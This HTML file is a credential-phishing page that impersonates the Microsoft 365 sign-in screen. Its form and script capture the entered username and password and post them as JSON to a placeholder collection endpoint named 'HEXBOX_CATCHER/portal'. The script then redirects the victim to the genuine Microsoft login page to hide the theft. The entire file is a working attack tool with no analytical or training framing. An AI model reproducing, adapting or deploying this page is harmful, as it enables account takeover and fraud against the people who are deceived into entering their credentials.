<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in to your account</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Arial,Helvetica,sans-serif;background:#f2f2f2;min-height:100vh;display:flex;flex-direction:column}
.ms-header{background:#0078d4;padding:14px 24px;display:flex;align-items:center}
.ms-wordmark{color:#fff;font-size:18px;font-weight:600;letter-spacing:.5px}
.container{flex:1;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;width:100%;max-width:440px;padding:44px 44px 36px;box-shadow:0 2px 6px rgba(0,0,0,.12)}
.card-title{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:16px}
.card-subtitle{font-size:13px;color:#1b1b1b;margin-bottom:24px}
.field-wrap{margin-bottom:16px}
.field-wrap label{display:block;font-size:13px;font-weight:600;color:#1b1b1b;margin-bottom:4px}
.field-wrap input{width:100%;padding:8px 10px;font-size:15px;border:1px solid #8a8886;outline:none;transition:border .15s}
.field-wrap input:focus{border-color:#0078d4;border-width:2px}
.error-msg{display:none;color:#a4262c;font-size:12px;margin-top:4px}
.error-msg.show{display:block}
.btn-signin{width:100%;padding:10px;background:#0078d4;color:#fff;font-size:15px;font-weight:600;border:none;cursor:pointer;margin-top:8px;transition:background .15s}
.btn-signin:hover{background:#106ebe}
.links-row{margin-top:20px;display:flex;gap:24px;flex-wrap:wrap}
.links-row a{font-size:13px;color:#0078d4;text-decoration:none}
.links-row a:hover{text-decoration:underline}
.footer{text-align:center;padding:16px;font-size:11px;color:#616161}
</style>
</head>
<body>

<div class="ms-header">
  <span class="ms-wordmark">Microsoft</span>
</div>

<div class="container">
  <div class="card">
    <div class="card-title">Sign in</div>
    <div class="card-subtitle">to continue to Microsoft 365</div>

    <form id="loginForm" action="HEXBOX_CATCHER/portal" method="POST" novalidate>
      <input type="hidden" name="portal" value="o365">

      <div class="field-wrap">
        <label for="email">Email, phone, or Skype</label>
        <input type="text" id="email" name="username" autocomplete="username"
               autocorrect="off" autocapitalize="off" spellcheck="false" required>
        <div class="error-msg" id="emailErr">Enter a valid email address.</div>
      </div>

      <div class="field-wrap">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" autocomplete="current-password" required>
        <div class="error-msg" id="passErr">Enter your password.</div>
      </div>

      <button type="submit" class="btn-signin">Sign in</button>

      <div class="links-row">
        <a href="#">Forgot password?</a>
        <a href="#">Sign-in options</a>
      </div>
    </form>
  </div>
</div>

<div class="footer">
  &copy; Microsoft 2024 &nbsp;|&nbsp; <a href="#" style="color:#0078d4;text-decoration:none">Privacy &amp; cookies</a>
  &nbsp;|&nbsp; <a href="#" style="color:#0078d4;text-decoration:none">Terms of use</a>
</div>

<script>
(function(){
  var form = document.getElementById('loginForm');
  var emailErr = document.getElementById('emailErr');
  var passErr = document.getElementById('passErr');

  form.addEventListener('submit', function(e){
    e.preventDefault();
    var username = document.getElementById('email').value.trim();
    var password = document.getElementById('password').value;
    var valid = true;

    if(!username){ emailErr.classList.add('show'); valid=false; }
    else { emailErr.classList.remove('show'); }
    if(!password){ passErr.classList.add('show'); valid=false; }
    else { passErr.classList.remove('show'); }
    if(!valid) return;

    var payload = {
      username: username,
      password: password,
      portal: 'o365',
      host: window.location.hostname
    };

    fetch('HEXBOX_CATCHER/portal', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify(payload),
      credentials: 'omit'
    }).catch(function(){})
      .finally(function(){
        window.location.href = 'https://login.microsoftonline.com';
      });
  });
})();
</script>
</body>
</html>
